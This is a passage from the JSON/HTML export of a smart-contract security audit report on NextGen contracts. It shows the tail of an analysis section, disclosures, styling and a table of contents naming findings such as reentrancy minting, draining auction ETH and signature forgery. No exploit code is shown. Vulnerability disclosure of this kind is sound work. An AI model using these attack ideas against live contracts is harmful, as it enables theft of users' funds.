<code>10000000000</code> to be used.</li>\n</ul>\n</li>\n<li>\n<p>Can we reenter through <code>cancelBid</code>? </p>\n<ul>\n<li>Not possible, since <code>auctionDataInfo</code> is updated to false before making external call to return bidderâ€™s ETH.</li>\n</ul>\n</li>\n<li>\n<p>Small mistake in docs:</p>\n<ul>\n<li>Mistake in docs - <a href=\"https://seize-io.gitbook.io/nextgen/for-creators/sales-models#sales-models-examples\">https://seize-io.gitbook.io/nextgen/for-creators/sales-models#sales-models-examples</a> </li>\n<li>In linear descending model, the statement is incorrect. It should be â€œDuring 10th Price period price 3.1 ETHâ€ and 11th Price period price remains constant as shown in the diagram above the explanation, as well.</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"time-spent\" style=\"position:relative;\"><a href=\"#time-spent\" aria-label=\"time spent permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time spent</h3>\n<p>140 hours</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2005#issuecomment-1846150156\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>This Analysis prevails and distinguishes itself from the rest by providing a systematic analysis of one of the randomness providers (ARRNG) which is validly <strong>not</strong> considered a de facto standard, while also ticking all other checkboxes. </p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-5\">High Risk Findings (5)</a></p>\n<ul>\n<li><a href=\"#h-01-attacker-can-reenter-to-mint-all-the-collection-supply\">[H-01] Attacker can reenter to mint all the collection supply</a></li>\n<li><a href=\"#h-02-attacker-can-drain-all-eth-from-auctiondemo-when-blocktimestamp--auctionendtime\">[H-02] Attacker can drain all ETH from <code>AuctionDemo</code> when <code>block.timestamp == auctionEndTime</code></a></li>\n<li><a href=\"#h-03-adversary-can-block-claimauction-due-to-push-strategy-to-transfer-assets-to-multiple-bidders\">[H-03] Adversary can block <code>claimAuction()</code> due to push-strategy to transfer assets to multiple bidders</a></li>\n<li><a href=\"#h-04-multiple-mints-can-brick-any-form-of-salesoption-3-mintings\">[H-04] Multiple mints can brick any form of <code>salesOption</code> 3 mintings</a></li>\n<li><a href=\"#h-05-permanent-dos-due-to-non-shrinking-array-usage-in-an-unbounded-loop\">H-05 Permanent DoS due to non-shrinking array usage in an unbounded loop</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-12\">Medium Risk Findings (12)</a></p>\n<ul>\n<li><a href=\"#m-01-mintercontractpayartist-can-result-in-double-the-intended-payout\">[M-01] <code>MinterContract::payArtist</code> can result in double the intended payout</a></li>\n<li><a href=\"#m-02-the-randomizervrf-and-randomizerrng-do-not-produce-hash-value\">[M-02] The <code>RandomizerVRF</code> and <code>RandomizerRNG</code> do not produce hash value.</a></li>\n<li><a href=\"#m-03-vulnerability-in-burntomint-function-allows-double-use-of-nft\">[M-03] Vulnerability in <code>burnToMint</code> function allows double use of NFT</a></li>\n<li><a href=\"#m-04-on-a-linear-or-exponential-descending-sale-model-a-user-that-mints-on-the-last-blocktimestamp-mints-at-an-unexpected-price\">[M-04] On a Linear or Exponential Descending Sale Model, a user that mints on the last <code>block.timestamp</code> mints at an unexpected price.</a></li>\n<li><a href=\"#m-05-auction-payout-goes-to-auctiondemo-contract-owner-not-the-token-owner\">[M-05] Auction payout goes to <code>AuctionDemo</code> contract owner, not the token owner</a></li>\n<li><a href=\"#m-06-artist-signatures-can-be-forged-to-impersonate-the-artist-behind-a-collection\">[M-06] Artist signatures can be forged to impersonate the artist behind a collection</a></li>\n<li><a href=\"#m-07-auction-winner-can-prevent-payments-via-safetransferfrom-callback\">[M-07] Auction winner can prevent payments via <code>safeTransferFrom</code> callback</a></li>\n<li><a href=\"#m-08-if-an-airdrop-happens-before-a-mint-the-price-could-skyrocket\">[M-08] If an airdrop happens before a mint the price could skyrocket</a></li>\n<li><a href=\"#m-09-getprice-salesoption-2-can-round-down-to-the-lower-barrier-skipping-the-last-time-period\">[M-09] <code>getPrice</code> <code>salesOption</code> 2 can round down to the lower barrier, skipping the last time period</a></li>\n<li><a href=\"#m-10-bidder-funds-can-become-unrecoverable-due-to-1-second-overlap-in-participatetoauction-and-claimauction\">[M-10] Bidder Funds Can Become Unrecoverable Due to 1 second Overlap in <code>participateToAuction()</code> and <code>claimAuction()</code></a></li>\n<li><a href=\"#m-11-unchecked-return-value-of-low-level-calldelegatecall\">M-11 Unchecked return value of low-level <code>call()/delegatecall()</code></a></li>\n<li><a href=\"#m-12-user-funds-sent-in-excess-are-not-refunded\">M-12 User funds sent in excess are not refunded</a></li>\n</ul>\n</li>\n<li><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></li>\n<li>\n<p><a href=\"#qa-report\">QA Report</a></p>\n<ul>\n<li><a href=\"#issue-summary\">Issue Summary</a></li>\n<li><a href=\"#01-nextgenrandomizervrf-randomizer-uses-goerli-keyhash\">01 <code>NextGenRandomizerVRF</code> randomizer uses Goerli <code>keyHash</code></a></li>\n<li><a href=\"#02-fulfillrandomwords-sets-the-token-hash-as-the-first-fulfilled-random-number-instead-of-calculating-a-hash\">02 <code>fulfillRandomWords</code> sets the token hash as the first fulfilled random number instead of calculating a hash</a></li>\n<li><a href=\"#03-insufficient-pseudo-randomness-is-masked-under-over-complicated-implementation\">03 Insufficient pseudo-randomness is masked under over-complicated implementation</a></li>\n<li><a href=\"#04-requestrandomwords-is-marked-as-payable-in-nextgenrandomizerrng-but-it-cant-be-called-with-value\">04 <code>requestRandomWords()</code> is marked as <code>payable</code> in <code>NextGenRandomizerRNG</code> but it canâ€™t be called with <code>value</code></a></li>\n<li><a href=\"#05-getword-returns-the-same-word-for-different-ids\">05 <code>getWord()</code> returns the same word for different ids</a></li>\n<li><a href=\"#06-predictable-pseudo-random-values-should-be-proposed-by-trusted-roles\">06 Predictable pseudo-random values should be proposed by trusted roles</a></li>\n<li><a href=\"#07-returnhighestbidder-doesnt-update-the-highbid-attribute-on-its-calculation\">07 <code>returnHighestBidder()</code> doesnâ€™t update the <code>highBid</code> attribute on its calculation</a></li>\n<li><a href=\"#08-auction-participants-will-have-their-funds-locked-until-nft-is-claimed\">08 Auction participants will have their funds locked until NFT is claimed</a></li>\n<li><a href=\"#09-airdropped-minted-tokens-for-auctions-should-be-transferred-to-a-escrow-contract\">09 Airdropped minted tokens for auctions should be transferred to a escrow contract</a></li>\n<li><a href=\"#10-the-receiver-of-the-funds-from-claimauction-should-be-moved-to-another-function\">10 The receiver of the funds from <code>claimAuction()</code> should be moved to another function</a></li>\n<li><a href=\"#11-use-supportsinterface-from-eip-165-instead-of-custom-made-checks\">11 Use <code>supportsInterface()</code> from EIP-165 instead of custom-made checks</a></li>\n<li><a href=\"#12-supportsinterface-is-incorrectly-implemented-on-nextgencore\">12 <code>supportsInterface()</code> is incorrectly implemented on <code>NextGenCore</code></a></li>\n<li><a href=\"#13-collection-scripts-with-indexes-999-and-1000-cant-be-updated\">13 Collection scripts with indexes <code>999</code> and <code>1000</code> canâ€™t be updated</a></li>\n<li><a href=\"#14-it-is-not-possible-to-add-or-remove-generative-scripts\">14 It is not possible to add or remove generative scripts</a></li>\n<li><a href=\"#15-merkle-nodes-can-have-64-bytes-length-making-internal-nodes-be-reinterpreted-as-leaf-values\">15 Merkle nodes can have 64 bytes length, making internal nodes be reinterpreted as leaf values</a></li>\n<li><a href=\"#16-merkle-proofs-from-burnorswapexternaltomint-could-be-used-in-mint-and-vice-versa\">16 Merkle proofs from <code>burnOrSwapExternalToMint()</code> could be used in <code>mint()</code> and vice versa</a></li>\n<li><a href=\"#17-lack-of-check-for-empty-artist-signature\">17 Lack of check for empty artist signature</a></li>\n<li><a href=\"#18-artist-cant-propose-new-addresses-and-percentages\">18 Artist canâ€™t propose new addresses and percentages</a></li>\n<li><a href=\"#19-acceptaddressesandpercentages-can-be-frontrunned-by-artists-to-change-settings\">19 <code>acceptAddressesAndPercentages()</code> can be frontrunned by artists to change settings</a></li>\n<li><a href=\"#20-acceptaddressesandpercentages-can-approve-addresses-and-percentages-that-have-not-been-set\">20 <code>acceptAddressesAndPercentages()</code> can approve addresses and percentages that have not been set</a></li>\n<li><a href=\"#21-unnecessary-address-payable-conversions\">21 Unnecessary address <code>payable</code> conversions</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#summary-1\">Summary</a></li>\n<li><a href=\"#g-01-derive-min--max-collection-bounds-dynamically\">G-01 Derive min / max collection bounds dynamically</a></li>\n<li><a href=\"#g-02-remove-redundant-flag-for-creation-of-collection\">G-02 Remove redundant flag for creation of collection</a></li>\n<li><a href=\"#g-03-remove-duplicate-reference-to-core-contract\">G-03 Remove duplicate reference to core contract</a></li>\n<li><a href=\"#g-04-remove-duplicate-reference-to-randomizer-contract\">G-04 Remove duplicate reference to randomizer contract</a></li>\n<li><a href=\"#g-05-remove-redundant-external-call-during-airdrop\">G-05 Remove redundant external call during airdrop</a></li>\n<li><a href=\"#g-06-optimize-creation-of-collection\">G-06 Optimize creation of collection</a></li>\n</ul>\n</li>\n<li><a href=\"#audit-analysis\">Audit Analysis</a></li>\n<li>\n<p><a href=\"#analysis-report\">Analysis Report</a></p>\n<ul>\n<li><a href=\"#preface\">Preface</a></li>\n<li><a href=\"#approach-taken-in-evaluating-the-codebase\">Approach taken in evaluating the codebase</a></li>\n<li><a href=\"#architecture-recommendations\">Architecture recommendations</a></li>\n<li><a href=\"#codebase-quality-analysis\">Codebase quality analysis</a></li>\n<li><a href=\"#centralization-risks\">Centralization risks</a></li>\n<li><a href=\"#resources-used-to-gain-deeper-context-on-the-codebase\">Resources used to gain deeper context on the codebase</a></li>\n<li><a href=\"#mechanism-review\">Mechanism Review</a></li>\n<li><a href=\"#systemic-risksarchitecture-level-weak-spots-and-how-they-can-be-mitigated\">Systemic Risks/Architecture-level weak spots and how they can be mitigated</a></li>\n<li><a href=\"#some-questions-i-asked-myself\">Some questions I asked myself</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}